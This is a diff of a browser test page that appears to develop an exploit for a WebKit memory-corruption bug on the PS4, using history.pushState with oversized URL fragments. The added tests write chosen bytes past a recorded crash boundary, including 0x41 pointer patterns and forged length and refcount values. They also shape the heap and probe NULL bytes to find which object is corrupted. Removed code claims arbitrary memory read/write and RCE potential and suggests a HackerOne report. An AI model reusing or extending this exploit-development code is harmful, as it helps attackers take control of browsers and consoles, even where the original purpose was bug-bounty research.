-                tests.push('[PASS] Write persists across navigation');
-            } else {
-                tests.push('[FAIL] Write does not persist across navigation');
-            }
+            log(`  [${i+1}/${encodingTests.length}] Testing: ${test.name}`, 'warn');
+            log(`    Logical: ${logicalLen} | Bytes: ${byteLen}`, 'info');
+            
+            history.pushState({}, "", "#" + payload);
+            log(`    ✓ Survived`, 'pass');
+            
+        } catch(e) {
+            log(`    ✗ Crashed: ${e.message}`, 'critical');
         }
-        
-        log('[RESULTS] Completed 5 critical tests:');
-        log('');
-        tests.forEach(t => log('  ' + t));
-        log('');
-        log('[SCORE] ' + score + ' / 5 tests passed');
-        log('');
-        
-        // Final verdict
-        log('=== FINAL VERDICT ===');
-        log('');
-        
-        if(score === 5) {
-            log('[VERDICT] REAL VULNERABILITY - ALL TESTS PASSED');
-            log('');
-            log('[CONFIRMED] The following primitives are REAL:');
-            log('  ✓ Arbitrary memory write');
-            log('  ✓ Arbitrary memory read');
-            log('  ✓ Shared ArrayBuffer in circular refs');
-            log('  ✓ Circular reference spec violation');
-            log('  ✓ Multi-path memory access');
-            log('');
-            log('[SEVERITY] CRITICAL');
-            log('[EXPLOITABILITY] HIGH');
-            log('[RCE POTENTIAL] CONFIRMED');
-            log('');
-            log('[RECOMMENDATION] Report as CRITICAL severity to HackerOne');
-            log('[BOUNTY EXPECTATION] HIGH (based on similar CVEs)');
-            
-        } else if(score >= 3) {
-            log('[VERDICT] LIKELY REAL - MAJORITY OF TESTS PASSED');
-            log('');
-            log('[STATUS] ' + score + ' out of 5 tests passed');
-            log('[CONFIDENCE] Medium-High');
-            log('');
-            log('[RECOMMENDATION] Report with moderate confidence');
-            log('[NOTE] Some edge cases may need further investigation');
-            
-        } else if(score >= 1) {
-            log('[VERDICT] UNCERTAIN - MIXED RESULTS');
-            log('');
-            log('[STATUS] Only ' + score + ' out of 5 tests passed');
-            log('[CONFIDENCE] Low');
-            log('');
-            log('[RECOMMENDATION] Further investigation needed');
-            log('[NOTE] May be partial vulnerability or false positive');
-            
-        } else {
-            log('[VERDICT] FALSE POSITIVE - NO TESTS PASSED');
-            log('');
-            log('[STATUS] 0 out of 5 tests passed');
-            log('[CONFIDENCE] Very Low');
-            log('');
-            log('[RECOMMENDATION] Do NOT report - likely false positive');
-            log('[NOTE] Browser appears to be following spec correctly');
-        }
-        
-        log('');
-        log('=== SANITY CHECK COMPLETE ===');
-        
-    } catch(e) {
-        log('[ERROR] Final verdict test failed: ' + e.message);
-        if(e.stack) log('Stack: ' + e.stack);
     }
+    
+    log('TEST 4.3 completed - encoding bugs are gold in WebKit\n', 'info');
 }
 
-log('PS4 WebKit Sanity Check Suite Loaded');
-log('');
-log('===================================================');
-log('OBJECTIVE: Verify if primitives are REAL or FALSE POSITIVES');
-log('===================================================');
-log('');
-log('This suite will rigorously test:');
-log('  1. Is shared buffer write REAL?');
-log('  2. Is memory actually shared (not cloned)?');
-log('  3. Can we PROVE memory corruption?');
-log('  4. Are circular refs truly bypassing spec?');
-log('');
-log('CRITICAL TESTS:');
-log('  - SANITY 1: Most important - verify shared write');
-log('  - SANITY 7: Verify spec violation');
-log('  - SANITY 10: Final comprehensive verdict');
-log('');
-log('RECOMMENDATION: Run tests in order 1, 7, 10 first');
-log('');
-log('Ready to run sanity checks. Click buttons above.');
-log('');
+// TEST 4.4 - StringImpl Adjacent Corruption
+async function test44_stringImplTarget() {
+    log('=== TEST 4.4: StringImpl Adjacent Corruption ===', 'critical');
+    log('Testing if overflow corrupts adjacent StringImpl fields', 'info');
+    
+    // Try to corrupt potential StringImpl fields: length, refcount, pointer
+    const corruptionTests = [
+        { name: 'Length=0', bytes: [0, 0, 0, 0] },
+        { name: 'Length=MAX', bytes: [0xFF, 0xFF, 0xFF, 0xFF] },
+        { name: 'Length=1', bytes: [1, 0, 0, 0] },
+        { name: 'RefCount=0', bytes: [0, 0, 0, 0] },
+        { name: 'Pointer low bits', bytes: [0x41, 0x41, 0, 0] },
+        { name: 'Pointer pattern', bytes: [0x41, 0x41, 0x41, 0x41] },
+        { name: 'Flag flip', bytes: [1, 0, 0, 0] },
+        { name: 'Mixed pattern', bytes: [0xAA, 0xBB, 0xCC, 0xDD] }
+    ];
+    
+    for (let i = 0; i < corruptionTests.length; i++) {
+        const test = corruptionTests[i];
+        try {
+            await delay(100);
+            
+            const base = "A".repeat(SAFE_BASE + SAFE_OFFSET);
+            let corruption = '';
+            for (let b of test.bytes) {
+                corruption += String.fromCharCode(b);
+            }
+            const payload = base + corruption;
+            
+            log(`  [${i+1}/${corruptionTests.length}] Testing: ${test.name}`, 'warn');
+            history.pushState({}, "", "#" + payload);
+            log(`    ✓ Survived corruption attempt`, 'pass');
+            
+        } catch(e) {
+            log(`    ✗ Crashed: ${e.message}`, 'critical');
+            log(`    ⚠️  CRITICAL: ${test.name} triggered crash!`, 'critical');
+        }
+    }
+    
+    log('TEST 4.4 completed - StringImpl corruption is key target\n', 'info');
+}
+
+// TEST 4.5 - Heap Layout Influence
+async function test45_heapShaping() {
+    log('=== TEST 4.5: Heap Layout Influence ===', 'critical');
+    log('Testing if heap shaping changes crash behavior', 'info');
+    
+    // Shape heap with different patterns
+    const shapingTests = [
+        { name: 'No shaping', prep: () => {} },
+        { name: 'Small strings', prep: () => {
+            for(let i = 0; i < 100; i++) {
+                history.pushState({}, "", "#small" + i);
+            }
+        }},
+        { name: 'Medium strings', prep: () => {
+            for(let i = 0; i < 50; i++) {
+                history.pushState({}, "", "#" + "M".repeat(500));
+            }
+        }},
+        { name: 'Large safe strings', prep: () => {
+            for(let i = 0; i < 10; i++) {
+                history.pushState({}, "", "#" + "L".repeat(SAFE_BASE + SAFE_OFFSET - 100));
+            }
+        }},
+        { name: 'Circular objects', prep: () => {
+            for(let i = 0; i < 20; i++) {
+                const obj = {data: "X".repeat(100)};
+                obj.self = obj;
+                try { history.pushState(obj, "", "#circ" + i); } catch(e) {}
+            }
+        }},
+        { name: 'Deep recursion', prep: () => {
+            function chain(d) { return d === 0 ? {end: true} : {next: chain(d-1)}; }
+            for(let i = 0; i < 10; i++) {
+                try { history.pushState(chain(50), "", "#deep" + i); } catch(e) {}
+            }
+        }}
+    ];
+    
+    for (let i = 0; i < shapingTests.length; i++) {
+        const test = shapingTests[i];
+        try {
+            await delay(200);
+            
+            log(`  [${i+1}/${shapingTests.length}] Shaping: ${test.name}`, 'warn');
+            test.prep();
+            await delay(100);
+            
+            const payload = "A".repeat(SAFE_BASE + CRASH_OFFSET);
+            history.pushState({}, "", "#crash_after_" + test.name.replace(/\s/g, '_'));
+            log(`    ✓ Survived after ${test.name}`, 'pass');
+            
+        } catch(e) {
+            log(`    ✗ Crashed after ${test.name}: ${e.message}`, 'critical');
+            log(`    ⚠️  Heap layout matters!`, 'critical');
+        }
+    }
+    
+    log('TEST 4.5 completed - heap sensitivity indicates neighbor influence\n', 'info');
+}
+
+// TEST 4.6 - NULL Byte Termination
+async function test46_nullByte() {
+    log('=== TEST 4.6: NULL Byte Termination ===', 'critical');
+    log('Testing NULL byte behavior (string length corruption indicator)', 'info');
+    
+    const nullTests = [
+        { name: 'NULL at overflow start', pos: 0 },
+        { name: 'NULL at +1 byte', pos: 1 },
+        { name: 'NULL at +2 bytes', pos: 2 },
+        { name: 'NULL at +3 bytes', pos: 3 },
+        { name: 'NULL at +4 bytes', pos: 4 },
+        { name: 'Double NULL', pos: 0, double: true },
+        { name: 'NULL every 4 bytes', pattern: true }
+    ];
+    
+    for (let i = 0; i < nullTests.length; i++) {
+        const test = nullTests[i];
+        try {
+            await delay(100);
+            
+            let payload = "A".repeat(SAFE_BASE + SAFE_OFFSET);
+            
+            if (test.pattern) {
+                // NULL every 4 bytes in overflow zone
+                for (let j = 0; j < CRASH_OFFSET; j++) {
+                    payload += (j % 4 === 0) ? '\u0000' : 'A';
+                }
+            } else {
+                payload += "A".repeat(test.pos) + '\u0000';
+                if (test.double) payload += '\u0000';
+                payload += "A".repeat(CRASH_OFFSET - test.pos - (test.double ? 2 : 1));
+            }
+            
+            log(`  [${i+1}/${nullTests.length}] Testing: ${test.name}`, 'warn');
+            history.pushState({}, "", "#" + payload);
+            log(`    ✓ Survived with NULL`, 'pass');
+            
+        } catch(e) {
+            log(`    ✗ Still crashed: ${e.message}`, 'critical');
+        }
+    }
+    
+    log('TEST 4.6 completed - NULL behavior reveals string handling\n', 'info');
+}
+
+// Run all tests sequentially
+async function runAllTests() {
+    if (!confirm('⚠️ WARNING: This will run all tests and may crash the browser.\n\nProceed?')) {
+        return;
+    }
+    
+    clearLog();
+    log('========================================', 'critical');
+    log('STEP 4: COMPLETE NEIGHBOR IDENTIFICATION', 'critical');
+    log('========================================\n', 'critical');
+    
+    await test41_byteImpact();
+    await delay(500);
+    
+    await test42_sentinelPatterns();
+    await delay(500);
+    
+    await test43_encodingEdges();
+    await delay(500);
+    
+    await test44_stringImplTarget();
+    await delay(500);
+    
+    await test45_heapShaping();
+    await delay(500);
+    
+    await test46_nullByte();
+    
+    log('\n========================================', 'critical');
+    log('ALL TESTS COMPLETED', 'critical');
+    log('========================================', 'critical');
+    log('\nANALYSIS CHECKLIST:', 'warn');
+    log('✓ Did different byte values cause different crashes? → Content control', 'info');
+    log('✓ Did sentinel patterns appear in crash addresses? → Pointer control', 'info');
+    log('✓ Did encoding change crash behavior? → Size confusion bug', 'info');
+    log('✓ Did specific 4-byte patterns trigger crashes? → Structure field corruption', 'info');
+    log('✓ Did heap shaping change results? → Neighbor confirmed', 'info');
+    log('✓ Did NULL bytes prevent crash? → String length corruption', 'info');
+}
+
+log('Step 4 tests loaded. Run individual tests or ALL tests.', 'pass');
+log('Known crash condition: 977 + 14461 bytes', 'warn');
+log('Safe condition: 977 + 14460 bytes\n', 'pass');
 </script>
 
 </body>
